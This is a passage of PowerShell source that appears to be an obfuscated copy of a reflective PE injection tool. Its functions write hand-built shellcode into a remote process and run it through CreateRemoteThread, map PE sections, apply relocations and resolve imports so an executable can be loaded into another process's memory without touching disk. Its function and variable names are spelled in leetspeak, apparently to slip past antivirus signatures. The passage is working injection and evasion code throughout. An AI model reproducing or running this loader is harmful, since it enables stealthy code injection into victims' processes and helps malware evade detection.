			Throw "PE file is not an EXE or DLL"
		}
		
		return $Info_of_PE
	}

	
	Function Get-NonLocalPr0cAddr
	{
		Param(
		[Parameter(Position=0, Mandatory=$true)]
		[IntPtr]
		$RemoteProcHandle,
		
		[Parameter(Position=1, Mandatory=$true)]
		[IntPtr]
		$RemoteDllHandle,
		
		[Parameter(Position=2, Mandatory=$true)]
		[String]
		$FunctionName
		)

		$PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		$FunctionNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
		

		$FunctionNameSize = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
		$RFuncNamePtr = $PC32_functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, $FunctionNameSize, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_READWRITE)
		if ($RFuncNamePtr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process"
		}

		[UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
		$Success = $PC32_functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RFuncNamePtr, $FunctionNamePtr, $FunctionNameSize, [Ref]$NumBytesWritten)
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($FunctionNamePtr)
		if ($Success -eq $false)
		{
			Throw "Unable to write DLL path to remote process memory"
		}
		if ($FunctionNameSize -ne $NumBytesWritten)
		{
			Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
		}
		

		$Kernel32Handle = $PC32_functions.GetModuleHandle.Invoke("kernel32.dll")
		$G3tPr0ce55AddressAddr = $PC32_functions.GetProcAddress.Invoke($Kernel32Handle, "GetProcAddress") #Kernel32 loaded to the same address for all processes

		

		$G3tPr0ce55AddressRetMem = $PC32_functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UInt64][UInt64]$PtrSize, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_READWRITE)
		if ($G3tPr0ce55AddressRetMem -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
		}
		
		



		[Byte[]]$G3tPr0ce55AddressSC = @()
		if ($Info_of_PE.PE64Bit -eq $true)
		{
			$G3tPr0ce55AddressSC1 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
			$G3tPr0ce55AddressSC2 = @(0x48, 0xba)
			$G3tPr0ce55AddressSC3 = @(0x48, 0xb8)
			$G3tPr0ce55AddressSC4 = @(0xff, 0xd0, 0x48, 0xb9)
			$G3tPr0ce55AddressSC5 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
		}
		else
		{
			$G3tPr0ce55AddressSC1 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
			$G3tPr0ce55AddressSC2 = @(0xb9)
			$G3tPr0ce55AddressSC3 = @(0x51, 0x50, 0xb8)
			$G3tPr0ce55AddressSC4 = @(0xff, 0xd0, 0xb9)
			$G3tPr0ce55AddressSC5 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
		}
		$SCLength = $G3tPr0ce55AddressSC1.Length + $G3tPr0ce55AddressSC2.Length + $G3tPr0ce55AddressSC3.Length + $G3tPr0ce55AddressSC4.Length + $G3tPr0ce55AddressSC5.Length + ($PtrSize * 4)
		$Mem_of_SCPS = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($SCLength)
		$Mem_of_SCPSOriginal = $Mem_of_SCPS
		
		Write-MemFromBytes -Bytes $G3tPr0ce55AddressSC1 -MemoryAddress $Mem_of_SCPS
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($G3tPr0ce55AddressSC1.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RemoteDllHandle, $Mem_of_SCPS, $false)
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($PtrSize)
		Write-MemFromBytes -Bytes $G3tPr0ce55AddressSC2 -MemoryAddress $Mem_of_SCPS
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($G3tPr0ce55AddressSC2.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($RFuncNamePtr, $Mem_of_SCPS, $false)
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($PtrSize)
		Write-MemFromBytes -Bytes $G3tPr0ce55AddressSC3 -MemoryAddress $Mem_of_SCPS
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($G3tPr0ce55AddressSC3.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($G3tPr0ce55AddressAddr, $Mem_of_SCPS, $false)
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($PtrSize)
		Write-MemFromBytes -Bytes $G3tPr0ce55AddressSC4 -MemoryAddress $Mem_of_SCPS
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($G3tPr0ce55AddressSC4.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($G3tPr0ce55AddressRetMem, $Mem_of_SCPS, $false)
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($PtrSize)
		Write-MemFromBytes -Bytes $G3tPr0ce55AddressSC5 -MemoryAddress $Mem_of_SCPS
		$Mem_of_SCPS = Add-S1gn3dlntAsUn51gn3d $Mem_of_SCPS ($G3tPr0ce55AddressSC5.Length)
		
		$RSCAddr = $PC32_functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $PC32_non_variables.MEM_COMMIT -bor $PC32_non_variables.MEM_RESERVE, $PC32_non_variables.PAGE_EXECUTE_READWRITE)
		if ($RSCAddr -eq [IntPtr]::Zero)
		{
			Throw "Unable to allocate memory in the remote process for shellcode"
		}
		
		$Success = $PC32_functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $Mem_of_SCPSOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
		if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
		{
			Throw "Unable to write shellcode to remote process memory."
		}
		
		$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions  #-Win32Functions
		$Result = $PC32_functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
		if ($Result -ne 0)
		{
			Throw "Call to CreateRemoteThread to call GetProcAddress failed."
		}
		

		[IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
		$Result = $PC32_functions.ReadProcessMemory.Invoke($RemoteProcHandle, $G3tPr0ce55AddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
		if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
		{
			Throw "Call to ReadProcessMemory failed"
		}
		[IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

		$PC32_functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $PC32_non_variables.MEM_RELEASE) | Out-Null
		$PC32_functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $PC32_non_variables.MEM_RELEASE) | Out-Null
		$PC32_functions.VirtualFreeEx.Invoke($RemoteProcHandle, $G3tPr0ce55AddressRetMem, [UIntPtr][UInt64]0, $PC32_non_variables.MEM_RELEASE) | Out-Null
		
		return $ProcAddress
	}


	Function Copy-Sections
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Info_of_PE,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$PC32_functions,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$PC32T_Y_P_E_S
		)
		
		for( $i = 0; $i -lt $Info_of_PE.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
		{
			[IntPtr]$SectionHeaderPtr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PC32T_Y_P_E_S.IMAGE_SECTION_HEADER)))
			$SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$PC32T_Y_P_E_S.IMAGE_SECTION_HEADER)
		

			[IntPtr]$SectionDestAddr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
			




			$SizeOfRawData = $SectionHeader.SizeOfRawData

			if ($SectionHeader.PointerToRawData -eq 0)
			{
				$SizeOfRawData = 0
			}
			
			if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
			{
				$SizeOfRawData = $SectionHeader.VirtualSize
			}
			
			if ($SizeOfRawData -gt 0)
			{
				Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -Info_of_PE $Info_of_PE -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
				[System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
			}
		

			if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
			{
				$Difference = $SectionHeader.VirtualSize - $SizeOfRawData
				[IntPtr]$StartAddress = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
				Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -Info_of_PE $Info_of_PE -StartAddress $StartAddress -Size $Difference | Out-Null
				$PC32_functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
			}
		}
	}


	Function Update-MemoryAddresses
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$Info_of_PE,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$OriginalImageBase,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$PC32_non_variables,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$PC32T_Y_P_E_S
		)
		
		[Int64]$BaseDifference = 0
		$AddDifference = $true #Track if the difference variable should be added or subtracted from variables
		[UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PC32T_Y_P_E_S.IMAGE_BASE_RELOCATION)
		

		if (($OriginalImageBase -eq [Int64]$Info_of_PE.EffectivePEHandle) `
				-or ($Info_of_PE.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}


		elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($Info_of_PE.EffectivePEHandle)) -eq $true)
		{
			$BaseDifference = Sub-S1gn3dlntAsUn51gn3d ($OriginalImageBase) ($Info_of_PE.EffectivePEHandle)
			$AddDifference = $false
		}
		elseif ((Compare-Val1GreaterThanVal2AsUInt ($Info_of_PE.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
		{
			$BaseDifference = Sub-S1gn3dlntAsUn51gn3d ($Info_of_PE.EffectivePEHandle) ($OriginalImageBase)
		}
		

		[IntPtr]$BaseRelocPtr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.PEHandle) ([Int64]$Info_of_PE.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{

			$BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$PC32T_Y_P_E_S.IMAGE_BASE_RELOCATION)

			if ($BaseRelocationTable.SizeOfBlock -eq 0)
			{
				break
			}

			[IntPtr]$MemAddrBase = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
			$NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2


			for($i = 0; $i -lt $NumRelocations; $i++)
			{

				$RelocationInfoPtr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
				[UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])


				[UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
				[UInt16]$RelocType = $RelocationInfo -band 0xF000
				for ($j = 0; $j -lt 12; $j++)
				{
					$RelocType = [Math]::Floor($RelocType / 2)
				}




				if (($RelocType -eq $PC32_non_variables.IMAGE_REL_BASED_HIGHLOW) `
						-or ($RelocType -eq $PC32_non_variables.IMAGE_REL_BASED_DIR64))
				{			

					[IntPtr]$FinalAddr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
					[IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
		
					if ($AddDifference -eq $true)
					{
						[IntPtr]$CurrAddr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$CurrAddr) ($BaseDifference))
					}
					else
					{
						[IntPtr]$CurrAddr = [IntPtr](Sub-S1gn3dlntAsUn51gn3d ([Int64]$CurrAddr) ($BaseDifference))
					}				

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
				}
				elseif ($RelocType -ne $PC32_non_variables.IMAGE_REL_BASED_ABSOLUTE)
				{

					Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
				}
			}
			
			$BaseRelocPtr = [IntPtr](Add-S1gn3dlntAsUn51gn3d ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
		}
	}


	Function Imp0rt-DeeEllEllImports
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		$Info_of_PE,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PC32_functions,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$PC32T_Y_P_E_S,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$PC32_non_variables,
		
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		$RemoteProcHandle
		)
		
		$RemoteLoading = $false
		if ($Info_of_PE.PEHandle -ne $Info_of_PE.EffectivePEHandle)
		{
			$RemoteLoading = $true
		}
		
		if ($Info_of_PE.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]$ImportDescriptorPtr = Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.PEHandle) ([Int64]$Info_of_PE.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			
			while ($true)
			{
				$ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$PC32T_Y_P_E_S.IMAGE_IMPORT_DESCRIPTOR)
				

				if ($ImportDescriptor.Characteristics -eq 0 `
						-and $ImportDescriptor.FirstThunk -eq 0 `
						-and $ImportDescriptor.ForwarderChain -eq 0 `
						-and $ImportDescriptor.Name -eq 0 `
						-and $ImportDescriptor.TimeDateStamp -eq 0)
				{
					Write-Verbose "Done importing DLL imports"
					break
				}

				$Imp0rtDeeEllEllHandle = [IntPtr]::Zero
				$Imp0rtDeeEllEllPathPtr = (Add-S1gn3dlntAsUn51gn3d ([Int64]$Info_of_PE.PEHandle) ([Int64]$ImportDescriptor.Name))
				$Imp0rtDeeEllEllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($Imp0rtDeeEllEllPathPtr)
				
				if ($RemoteLoading -eq $true)
				{
					$Imp0rtDeeEllEllHandle = Imp0rt-DeeEllEllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -Imp0rtDeeEllEllPathPtr $Imp0rtDeeEllEllPathPtr
				}
				else
				{
					$Imp0rtDeeEllEllHandle = $PC32_functions.Lib_Load.Invoke($Imp0rtDeeEllEllPath)
				}

				if (($Imp0rtDeeEllEllHandle -eq $null) -or ($Imp0rtDeeEllEllHandle -eq [IntPtr]::Zero))
				{
					throw "Error importing DLL, DLLName: $Imp0rtDeeEllEllPath"
				}
				

				[IntPtr]$ThunkRef = Add-S1gn3dlntAsUn51gn3d ($Info_of_PE.PEHandle) ($ImportDescriptor.FirstThunk)
				[IntPtr]$OriginalThunkRef = Add-S1gn3dlntAsUn51gn3d ($Info_of_PE.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
				[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				
				while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
				{
					$ProcedureName = ''



					[IntPtr]$NewThunkRef = [IntPtr]::Zero
					if([Int64]$OriginalThunkRefVal -lt 0)
					{
						$ProcedureName = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
					}
					else
					{
						[IntPtr]$StringAddr = Add-S1gn3dlntAsUn51gn3d ($Info_of_PE.PEHandle) ($OriginalThunkRefVal)
						$StringAddr = Add-S1gn3dlntAsUn51gn3d $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						$ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
					}
					
					if ($RemoteLoading -eq $true)
					{
						[IntPtr]$NewThunkRef = Get-NonLocalPr0cAddr -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $Imp0rtDeeEllEllHandle -FunctionName $ProcedureName
					}
					else
					{
						if($ProcedureName -is [string])
						{
						    [IntPtr]$NewThunkRef = $PC32_functions.GetProcAddress.Invoke($Imp0rtDeeEllEllHandle, $ProcedureName)
						}
						else
						{
						    [IntPtr]$NewThunkRef = $PC32_functions.GetProcAddressOrdinal.Invoke($Imp0rtDeeEllEllHandle, $ProcedureName)
						}
					}
					
					if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
					{
						Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $Imp0rtDeeEllEllPath"
					}

					[System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
					
					$ThunkRef = Add-S1gn3dlntAsUn51gn3d ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRef = Add-S1gn3dlntAsUn51gn3d ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
				}
				
				$ImportDescriptorPtr = Add-S1gn3dlntAsUn51gn3d ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$PC32T_Y_P_E_S.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}

	Function Get-VirtualProtectValue
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		$SectionCharacteristics
		)
		
		$Pr0t3ct10nFl4g = 0x0
		if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_EXECUTE_READWRITE
				}
				else
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_READWRITE
				}
				else
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_READONLY
				}
			}
			else
			{
				if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_WRITECOPY
				}
				else
				{
					$Pr0t3ct10nFl4g = $PC32_non_variables.PAGE_NOACCESS
				}
			}
		}
		
		if (($SectionCharacteristics -band $PC32_non_variables.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			$Pr0t3ct10nFl4g = $Pr0t3ct10nFl4g -bor $PC32_non_variables.PAGE_NOCACHE
		}
		
		return $Pr0t3ct10nFl4g
	}

